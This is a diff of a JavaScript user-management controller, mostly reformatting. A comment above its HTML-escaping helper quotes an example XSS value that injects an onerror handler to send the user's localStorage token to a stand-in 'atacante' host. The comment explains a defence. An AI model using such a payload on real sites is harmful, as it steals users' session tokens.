@@ -1,8 +1,8 @@
-﻿/**
+/* global BSPDataTable, BSPModal, BSPVal, UsuariosModel, showAlertError, showAlertSuccess */
+/**
  * Usuarios Controller — con paginación, filtros de fecha y selector de registros
  */
 document.addEventListener('DOMContentLoaded', async () => {
-
   /**
    * Escapa datos de usuario antes de insertarlos con innerHTML.
    * Sin esto, un valor como  x" onerror="fetch('//atacante/?t='+localStorage.bspToken)
@@ -11,15 +11,20 @@ document.addEventListener('DOMContentLoaded', async () => {
    */
   const esc = (v) => (window.BSPVal?.escapeHtml
     ? window.BSPVal.escapeHtml(String(v ?? ''))
-    : String(v ?? '').replace(/[&<>"'`/]/g, c => ({
-        '&': '&amp;', '<': '&lt;', '>': '&gt;',
-        '"': '&quot;', "'": '&#39;', '/': '&#x2F;', '`': '&#x60;'
-      }[c])));
+    : String(v ?? '').replace(/[&<>"'`/]/g, (c) => ({
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#39;',
+      '/': '&#x2F;',
+      '`': '&#x60;',
+    }[c])));
 
   // Filtra dígitos mientras se escribe (antes oninput= inline en el HTML).
-  ['campo-nombre', 'campo-apellidos'].forEach(id => {
+  ['campo-nombre', 'campo-apellidos'].forEach((id) => {
     const el = document.getElementById(id);
-    el?.addEventListener('input', function () { this.value = this.value.replace(/[0-9]/g, ''); });
+    el?.addEventListener('input', function soloLetras() { this.value = this.value.replace(/[0-9]/g, ''); });
   });
 
   // Control de acceso contra el SERVIDOR, no contra localStorage.
@@ -29,31 +34,31 @@ document.addEventListener('DOMContentLoaded', async () => {
   if (!sesion) return;
 
   // ── Referencias DOM ──────────────────────────────────────────────────────
-  const modal          = document.getElementById('modal-usuario');
-  const modalTitle     = document.getElementById('modal-title');
-  const formUsuario    = document.getElementById('form-usuario');
-  const btnNuevo       = document.getElementById('btn-nuevo-usuario');
+  const modal = document.getElementById('modal-usuario');
+  const modalTitle = document.getElementById('modal-title');
+  const formUsuario = document.getElementById('form-usuario');
+  const btnNuevo = document.getElementById('btn-nuevo-usuario');
   const btnCerrarModal = document.getElementById('btn-cerrar-modal');
-  const btnCancelar    = document.getElementById('btn-cancelar');
-  const modalError     = document.getElementById('modal-error');
-  const passHint       = document.getElementById('pass-hint');
-  const contTotal      = document.getElementById('cont-total');
-  const contActivos    = document.getElementById('cont-activos');
-  const contInactivos  = document.getElementById('cont-inactivos');
-  const modalOverlay   = document.getElementById('modal-overlay');
+  const btnCancelar = document.getElementById('btn-cancelar');
+  const modalError = document.getElementById('modal-error');
+  const passHint = document.getElementById('pass-hint');
+  const contTotal = document.getElementById('cont-total');
+  const contActivos = document.getElementById('cont-activos');
+  const contInactivos = document.getElementById('cont-inactivos');
+  const modalOverlay = document.getElementById('modal-overlay');
 
   // Modal de perfil
-  const modalPerfil      = document.getElementById('modal-perfil');
-  const btnCerrarPerfil  = document.getElementById('btn-cerrar-perfil');
-  const btnPerfilCerrar  = document.getElementById('btn-perfil-cerrar');
-  const btnPerfilEditar  = document.getElementById('btn-perfil-editar');
+  const modalPerfil = document.getElementById('modal-perfil');
+  const btnCerrarPerfil = document.getElementById('btn-cerrar-perfil');
+  const btnPerfilCerrar = document.getElementById('btn-perfil-cerrar');
+  const btnPerfilEditar = document.getElementById('btn-perfil-editar');
 
   let editandoId = null;
 
   // ── Poblar las sugerencias de especialidad (texto libre permitido) ───────
   const datalistEsp = document.getElementById('especialidades-sugeridas');
   if (datalistEsp && Array.isArray(UsuariosModel.ESPECIALIDADES)) {
-    UsuariosModel.ESPECIALIDADES.forEach(esp => {
+    UsuariosModel.ESPECIALIDADES.forEach((esp) => {
       const opt = document.createElement('option');
       opt.value = esp;
       datalistEsp.appendChild(opt);
@@ -63,18 +68,18 @@ document.addEventListener('DOMContentLoaded', async () => {
   // ── Helpers ──────────────────────────────────────────────────────────────
   function rolBadge(rol) {
     const map = {
-      'Administrador': '<span class="badge badge-blue">Administrador</span>',
-      'Colaborador':   '<span class="badge badge-amber">Colaborador</span>',
-      'Voluntario':    '<span class="badge badge-purple">Voluntario</span>'
+      Administrador: '<span class="badge badge-blue">Administrador</span>',
+      Colaborador: '<span class="badge badge-amber">Colaborador</span>',
+      Voluntario: '<span class="badge badge-purple">Voluntario</span>',
     };
     return map[rol] || `<span class="badge">${rol}</span>`;
   }
 
   function colorAvatar(rol) {
     const map = {
-      'Administrador': 'linear-gradient(135deg,#1E3A8A,#2D4FAF)',
-      'Colaborador':   'linear-gradient(135deg,#d97706,#F5C215)',
-      'Voluntario':    'linear-gradient(135deg,#64748b,#94a3b8)'
+      Administrador: 'linear-gradient(135deg,#1E3A8A,#2D4FAF)',
+      Colaborador: 'linear-gradient(135deg,#d97706,#F5C215)',
+      Voluntario: 'linear-gradient(135deg,#64748b,#94a3b8)',
     };
     return map[rol] || '#6b7280';
   }
@@ -82,9 +87,9 @@ document.addEventListener('DOMContentLoaded', async () => {
   // el HTML generado por innerHTML, que no debe llevar style="" inline).
   function colorAvatarClase(rol) {
     const map = {
-      'Administrador': 'user-avatar-sm--administrador',
-      'Colaborador':   'user-avatar-sm--colaborador',
-      'Voluntario':    'user-avatar-sm--voluntario'
+      Administrador: 'user-avatar-sm--administrador',
+      Colaborador: 'user-avatar-sm--colaborador',
+      Voluntario: 'user-avatar-sm--voluntario',
     };
     return map[rol] || 'user-avatar-sm--otro';
   }
@@ -96,31 +101,33 @@ document.addEventListener('DOMContentLoaded', async () => {
     const todos = await UsuariosModel.getAll();
 
     // Actualizar contadores
-    if (contTotal)     contTotal.textContent     = todos.length;
-    if (contActivos)   contActivos.textContent   = todos.filter(u => u.activo).length;
-    if (contInactivos) contInactivos.textContent = todos.filter(u => !u.activo).length;
+    if (contTotal) contTotal.textContent = todos.length;
+    if (contActivos) contActivos.textContent = todos.filter((u) => u.activo).length;
+    if (contInactivos) contInactivos.textContent = todos.filter((u) => !u.activo).length;
 
-    const data = todos.map(u => ({
+    const data = todos.map((u) => ({
       ...u,
-      estadoTexto: u.activo ? 'Activo' : 'Inactivo'
+      estadoTexto: u.activo ? 'Activo' : 'Inactivo',
     }));
 
     // Opciones del filtro de especialidad: derivadas de los datos reales
     // (texto libre) combinadas con las sugerencias del catálogo.
-    const especialidadesUsadas = [...new Set(todos.map(u => u.especialidad).filter(Boolean))];
-    const opcionesEspecialidad = [...new Set([...especialidadesUsadas, ...(UsuariosModel.ESPECIALIDADES || [])])].sort();
+    const especialidadesUsadas = [...new Set(todos.map((u) => u.especialidad).filter(Boolean))];
+    const opcionesEspecialidad = [
+      ...new Set([...especialidadesUsadas, ...(UsuariosModel.ESPECIALIDADES || [])]),
+    ].sort();
 
     function renderRow(u) {
-      const badgeRol    = rolBadge(u.rol);
+      const badgeRol = rolBadge(u.rol);
       const badgeEstado = u.activo
         ? '<span class="badge badge-green">Activo</span>'
         : '<span class="badge badge-red">Inactivo</span>';
       const btnToggle = u.id === 1
-        ? `<button class="btn-accion btn-toggle" disabled title="No se puede desactivar al admin principal"><i class="bx bx-lock" aria-hidden="true"></i></button>`
+        ? '<button class="btn-accion btn-toggle" disabled title="No se puede desactivar al admin principal"><i class="bx bx-lock" aria-hidden="true"></i></button>'
         : `<button class="btn-accion btn-toggle" data-action="toggle-usuario" data-id="${u.id}" title="${u.activo ? 'Desactivar' : 'Activar'}"><i class="bx ${u.activo ? 'bx-toggle-right' : 'bx-toggle-left'}"></i></button>`;
-      const avatar      = esc(String(u.nombre ?? '').charAt(0).toUpperCase());
+      const avatar = esc(String(u.nombre ?? '').charAt(0).toUpperCase());
       const avatarClase = colorAvatarClase(u.rol);
-      const avatarHTML  = u.foto
+      const avatarHTML = u.foto
         ? `<div class="user-avatar-sm user-avatar-foto"><img src="${esc(u.foto)}" alt="${esc(u.nombre)}" /></div>`
         : `<div class="user-avatar-sm ${avatarClase}">${avatar}</div>`;
       return `
@@ -147,16 +154,22 @@ document.addEventListener('DOMContentLoaded', async () => {
 
     if (!dtUsuarios) {
       dtUsuarios = new BSPDataTable({
-        containerId:  'dt-usuarios',
+        containerId: 'dt-usuarios',
         data,
-        pageSize:     10,
+        pageSize: 10,
         searchFields: ['nombre', 'username', 'email', 'especialidad', 'ocupacion', 'ubicacion'],
         filters: [
-          { key: 'rol',          label: 'Rol',          type: 'select', options: ['Administrador', 'Colaborador', 'Voluntario'] },
-          { key: 'especialidad', label: 'Especialidad', type: 'select', options: opcionesEspecialidad },
-          { key: 'estadoTexto',  label: 'Estado',       type: 'select', options: ['Activo', 'Inactivo'] },
+          {
+            key: 'rol', label: 'Rol', type: 'select', options: ['Administrador', 'Colaborador', 'Voluntario'],
+          },
+          {
+            key: 'especialidad', label: 'Especialidad', type: 'select', options: opcionesEspecialidad,
+          },
+          {
+            key: 'estadoTexto', label: 'Estado', type: 'select', options: ['Activo', 'Inactivo'],
+          },
           { key: 'creado', label: 'Desde', type: 'date-from' },
-          { key: 'creado', label: 'Hasta', type: 'date-to'   },
+          { key: 'creado', label: 'Hasta', type: 'date-to' },
         ],
         renderRow,
         headerHTML: `
@@ -168,18 +181,18 @@ document.addEventListener('DOMContentLoaded', async () => {
           <span>Fecha</span>
           <span class="acciones-cell">Acciones</span>
         `,
-        exportable:   true,
-        exportName:   'usuarios',
+        exportable: true,
+        exportName: 'usuarios',
         exportFields: ['nombre', 'username', 'email', 'rol', 'especialidad', 'ocupacion', 'ubicacion', 'telefono', 'estadoTexto', 'creado'],
         exportLabels: ['Nombre', 'Usuario', 'Correo', 'Rol', 'Especialidad', 'Ocupación', 'Ubicación', 'Teléfono', 'Estado', 'Registrado'],
-        emptyHTML: `<div class="dt-empty"><i class="bx bx-user-x" aria-hidden="true"></i><p>No se encontraron usuarios con esos criterios.</p></div>`
+        emptyHTML: '<div class="dt-empty"><i class="bx bx-user-x" aria-hidden="true"></i><p>No se encontraron usuarios con esos criterios.</p></div>',
       });
-      window.__bspDT['dt-usuarios'] = dtUsuarios;
+      window.bspDataTables['dt-usuarios'] = dtUsuarios;
       dtUsuarios.init();
       document.getElementById('dt-usuarios-body')?.addEventListener('click', (e) => {
         const btn = e.target.closest('[data-action]');
         if (!btn || btn.disabled) return;
-        const id = btn.dataset.id;
+        const { id } = btn.dataset;
         if (btn.dataset.action === 'ver-perfil') verPerfil(id);
         else if (btn.dataset.action === 'editar-usuario') abrirEditar(id);
         else if (btn.dataset.action === 'toggle-usuario') toggleUsuario(id);
@@ -206,17 +219,17 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (!u) return;
     editandoId = id;
     modalTitle.textContent = 'Editar Usuario';
-    document.getElementById('campo-nombre').value    = u.nombres || u.nombre;
+    document.getElementById('campo-nombre').value = u.nombres || u.nombre;
     document.getElementById('campo-apellidos').value = u.apellidos || '';
-    document.getElementById('campo-username').value  = u.username;
-    document.getElementById('campo-email').value     = u.email;
-    document.getElementById('campo-rol').value       = u.rol;
-    document.getElementById('campo-telefono').value    = u.telefono     || '';
-    document.getElementById('campo-ubicacion').value   = u.ubicacion    || '';
-    document.getElementById('campo-ocupacion').value   = u.ocupacion    || '';
+    document.getElementById('campo-username').value = u.username;
+    document.getElementById('campo-email').value = u.email;
+    document.getElementById('campo-rol').value = u.rol;
+    document.getElementById('campo-telefono').value = u.telefono || '';
+    document.getElementById('campo-ubicacion').value = u.ubicacion || '';
+    document.getElementById('campo-ocupacion').value = u.ocupacion || '';
     document.getElementById('campo-especialidad').value = u.especialidad || '';
-    document.getElementById('campo-bio').value         = u.bio          || '';
-    document.getElementById('campo-password').value  = '';
+    document.getElementById('campo-bio').value = u.bio || '';
+    document.getElementById('campo-password').value = '';
     document.getElementById('campo-password').required = false;
     passHint.style.display = 'block';
     modalError.style.display = 'none';
@@ -233,8 +246,8 @@ document.addEventListener('DOMContentLoaded', async () => {
   const RX_USERNAME = /^[a-zA-Z0-9_]+$/;
   const ROLES_VALIDOS = ['Administrador', 'Colaborador', 'Voluntario'];
 
-  const _err = (id, msg) => BSPVal._err(id, msg);
-  const _ok  = (...ids) => BSPVal._ok(...ids);
+  const localErr = (id, msg) => BSPVal.localErr(id, msg);
+  const localOk = (...ids) => BSPVal.localOk(...ids);
 
   // Cerrojo anti-doble-submit (mismo patrón que auth.controller.js).
   let enviandoUsuario = false;
@@ -246,68 +259,67 @@ document.addEventListener('DOMContentLoaded', async () => {
     modalError.style.display = 'none';
 
     /* Leer valores — todos trimados antes de validar y antes de guardar */
-    const nombre    = BSPVal.cleanText(document.getElementById('campo-nombre').value);
+    const nombre = BSPVal.cleanText(document.getElementById('campo-nombre').value);
     const apellidos = BSPVal.cleanText(document.getElementById('campo-apellidos').value);
     const username = document.getElementById('campo-username').value.trim().toLowerCase();
     const emailVal = document.getElementById('campo-email').value.trim().toLowerCase();
-    const rol      = document.getElementById('campo-rol').value;
+    const rol = document.getElementById('campo-rol').value;
     const password = document.getElementById('campo-password').value; // sin trim: los espacios son intencionales como error
-    const telefono    = BSPVal.cleanText(document.getElementById('campo-telefono').value);
-    const ubicacion   = BSPVal.cleanText(document.getElementById('campo-ubicacion').value);
-    const ocupacion   = BSPVal.cleanText(document.getElementById('campo-ocupacion').value);
+    const telefono = BSPVal.cleanText(document.getElementById('campo-telefono').value);
+    const ubicacion = BSPVal.cleanText(document.getElementById('campo-ubicacion').value);
+    const ocupacion = BSPVal.cleanText(document.getElementById('campo-ocupacion').value);
     const especialidad = BSPVal.cleanText(document.getElementById('campo-especialidad').value);
-    const bio         = BSPVal.cleanText(document.getElementById('campo-bio').value);
+    const bio = BSPVal.cleanText(document.getElementById('campo-bio').value);
 
     // ── Limpiar estado previo ─────────────────────────────────────────────
-    _ok('campo-nombre','campo-apellidos','campo-username','campo-email','campo-rol','campo-password','campo-especialidad');
+    localOk('campo-nombre', 'campo-apellidos', 'campo-username', 'campo-email', 'campo-rol', 'campo-password', 'campo-especialidad');
     let valido = true;
 
     /* Nombres: mínimo 3, máximo 80, solo letras */
     let err;
     err = BSPVal.txt(nombre, { min: 3, max: 80, label: 'El nombre' });
-    if (err) { _err('campo-nombre', err); valido = false; }
-    else {
+    if (err) { localErr('campo-nombre', err); valido = false; } else {
       err = BSPVal.soloLetras(nombre, { label: 'El nombre' });
-      if (err) { _err('campo-nombre', err); valido = false; }
+      if (err) { localErr('campo-nombre', err); valido = false; }
     }
 
     /* Apellidos: opcional; si viene, máximo 80 y solo letras */
     if (apellidos) {
       err = BSPVal.txt(apellidos, { min: 2, max: 80, label: 'El apellido' })
          || BSPVal.soloLetras(apellidos, { label: 'El apellido' });
-      if (err) { _err('campo-apellidos', err); valido = false; }
+      if (err) { localErr('campo-apellidos', err); valido = false; }
     }
 
     /* Username: mínimo 3, máximo 30, solo alfanumérico + _ */
     if (!username || username.length < 3) {
-      _err('campo-username', 'El usuario debe tener al menos 3 caracteres.'); valido = false;
+      localErr('campo-username', 'El usuario debe tener al menos 3 caracteres.'); valido = false;
     } else if (!RX_USERNAME.test(username)) {
-      _err('campo-username', 'Solo letras, números y guión bajo (_). Sin espacios.'); valido = false;
+      localErr('campo-username', 'Solo letras, números y guión bajo (_). Sin espacios.'); valido = false;
     } else if (username.length > 30) {
-      _err('campo-username', 'El usuario no puede superar 30 caracteres.'); valido = false;
+      localErr('campo-username', 'El usuario no puede superar 30 caracteres.'); valido = false;
     }
 
     /* Email: regex estricta, máximo 254 chars */
     err = BSPVal.email(emailVal);
-    if (err) { _err('campo-email', err); valido = false; }
+    if (err) { localErr('campo-email', err); valido = false; }
 
     /* Teléfono (opcional): si viene, exactamente 10 dígitos numéricos */
     err = BSPVal.tel(telefono, { required: false });
-    if (err) { _err('campo-telefono', err); valido = false; } else { _ok('campo-telefono'); }
+    if (err) { localErr('campo-telefono', err); valido = false; } else { localOk('campo-telefono'); }
 
     /* Rol: validado contra lista blanca — previene manipulación del DOM */
     err = BSPVal.select(rol, ROLES_VALIDOS, { label: 'El rol' });
-    if (err) { _err('campo-rol', err); valido = false; }
+    if (err) { localErr('campo-rol', err); valido = false; }
 
     /* Contraseña (solo obligatoria al crear): mínimo 6, mezcla letras+números, sin espacios */
     if (editandoId === null) {
       err = BSPVal.password(password, { min: 6 });
-      if (err) { _err('campo-password', err); valido = false; }
+      if (err) { localErr('campo-password', err); valido = false; }
     }
 
     /* Especialidad: texto libre opcional, máximo 80 caracteres */
     if (especialidad.length > 80) {
-      _err('campo-especialidad', 'La especialidad no puede superar 80 caracteres.'); valido = false;
+      localErr('campo-especialidad', 'La especialidad no puede superar 80 caracteres.'); valido = false;
     }
 
     if (!valido) return;
@@ -316,8 +328,20 @@ document.addEventListener('DOMContentLoaded', async () => {
     /* Enviar datos limpios al modelo — never raw .value.
        nombres/apellidos son los hechos atómicos (BD); nombre queda solo
        para los mensajes de la interfaz. */
-    const data = { nombres: nombre, apellidos, nombre: apellidos ? `${nombre} ${apellidos}` : nombre,
-                   username, email: emailVal, rol, password, telefono, ubicacion, ocupacion, especialidad, bio };
+    const data = {
+      nombres: nombre,
+      apellidos,
+      nombre: apellidos ? `${nombre} ${apellidos}` : nombre,
+      username,
+      email: emailVal,
+      rol,
+      password,
+      telefono,
+      ubicacion,
+      ocupacion,
+      especialidad,
+      bio,
+    };
 
     /* Llamada async al modelo (Supabase) */
     const btnSubmitUsuario = formUsuario.querySelector('button[type="submit"]');
@@ -337,7 +361,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       return;
     }
     if (!resultado.ok) {
-      modalError.textContent   = resultado.error;
+      modalError.textContent = resultado.error;
       modalError.style.display = 'block';
       enviandoUsuario = false;
       if (btnSubmitUsuario) { btnSubmitUsuario.disabled = false; btnSubmitUsuario.removeAttribute('aria-busy'); }
@@ -350,7 +374,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     showAlertSuccess(
       editandoId === null
         ? `El usuario "${data.nombre}" fue creado exitosamente.`
-        : `Los datos de "${data.nombre}" fueron actualizados.`
+        : `Los datos de "${data.nombre}" fueron actualizados.`,
     );
   });
 
@@ -363,14 +387,14 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
     await renderTabla();
     showAlertSuccess(
-      resultado.activo ? 'El usuario ahora puede iniciar sesión.' : 'El usuario ha sido desactivado.'
+      resultado.activo ? 'El usuario ahora puede iniciar sesión.' : 'El usuario ha sido desactivado.',
     );
   }
 
   // ── Modal VER PERFIL ───────────────────────────────────────────────────
   let perfilViendoId = null;
 
-  function _filaPerfil(icono, label, valor) {
+  function localFilaPerfil(icono, label, valor) {
     if (!valor) return '';
     return `
       <div class="perfil-row">
@@ -387,25 +411,25 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (!u) return;
     perfilViendoId = id;
 
-    const avatar      = document.getElementById('perfil-avatar');
+    const avatar = document.getElementById('perfil-avatar');
     if (u.foto) {
       // Construido por DOM: asignar .src como propiedad impide la inyección
       // de atributos (p. ej. onerror) desde el valor de la foto.
       avatar.textContent = '';
       const img = document.createElement('img');
-      img.src       = u.foto;
-      img.alt       = String(u.nombre ?? '');
+      img.src = u.foto;
+      img.alt = String(u.nombre ?? '');
       img.className = 'perfil-avatar-img';
       avatar.appendChild(img);
       avatar.style.background = 'transparent';
     } else {
-      avatar.innerHTML        = '';
-      avatar.textContent      = String(u.nombre ?? '').charAt(0).toUpperCase();
+      avatar.innerHTML = '';
+      avatar.textContent = String(u.nombre ?? '').charAt(0).toUpperCase();
       avatar.style.background = colorAvatar(u.rol);
     }
 
-    document.getElementById('perfil-nombre').textContent   = u.nombre;
-    document.getElementById('perfil-username').textContent = '@' + u.username;
+    document.getElementById('perfil-nombre').textContent = u.nombre;
+    document.getElementById('perfil-username').textContent = `@${u.username}`;
 
     const estadoBadge = u.activo
       ? '<span class="badge badge-green">Activo</span>'
@@ -413,14 +437,13 @@ document.addEventListener('DOMContentLoaded', async () => {
     const espBadge = u.especialidad ? `<span class="badge badge-especialidad">${esc(u.especialidad)}</span>` : '';
     document.getElementById('perfil-badges').innerHTML = rolBadge(u.rol) + espBadge + estadoBadge;
 
-    document.getElementById('perfil-info').innerHTML =
-      _filaPerfil('bx-envelope',  'Correo',        u.email) +
-      _filaPerfil('bx-phone',     'Teléfono',      u.telefono) +
-      _filaPerfil('bx-map',       'Ubicación',     u.ubicacion) +
-      _filaPerfil('bx-briefcase', 'A qué se dedica', u.ocupacion) +
-      _filaPerfil('bx-star',      'Especialidad',  u.especialidad || 'Ninguna') +
-      _filaPerfil('bx-note',      'Información adicional', u.bio) +
-      _filaPerfil('bx-calendar',  'Registrado',    u.creado);
+    document.getElementById('perfil-info').innerHTML = localFilaPerfil('bx-envelope', 'Correo', u.email)
+      + localFilaPerfil('bx-phone', 'Teléfono', u.telefono)
+      + localFilaPerfil('bx-map', 'Ubicación', u.ubicacion)
+      + localFilaPerfil('bx-briefcase', 'A qué se dedica', u.ocupacion)
+      + localFilaPerfil('bx-star', 'Especialidad', u.especialidad || 'Ninguna')
+      + localFilaPerfil('bx-note', 'Información adicional', u.bio)
+      + localFilaPerfil('bx-calendar', 'Registrado', u.creado);
 
     BSPModal.abrir({ overlay: modalOverlay, modal: modalPerfil });
   }
@@ -445,7 +468,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 
   // ── Restricciones HTML dinámicas ─────────────────────────────────────────
   [['campo-nombre', 80], ['campo-apellidos', 80], ['campo-username', 30], ['campo-telefono', 20],
-   ['campo-ubicacion', 120], ['campo-ocupacion', 100], ['campo-bio', 500]].forEach(([id, max]) => {
+    ['campo-ubicacion', 120], ['campo-ocupacion', 100], ['campo-bio', 500]].forEach(([id, max]) => {
     const el = document.getElementById(id);
     if (el) el.maxLength = max;
   });
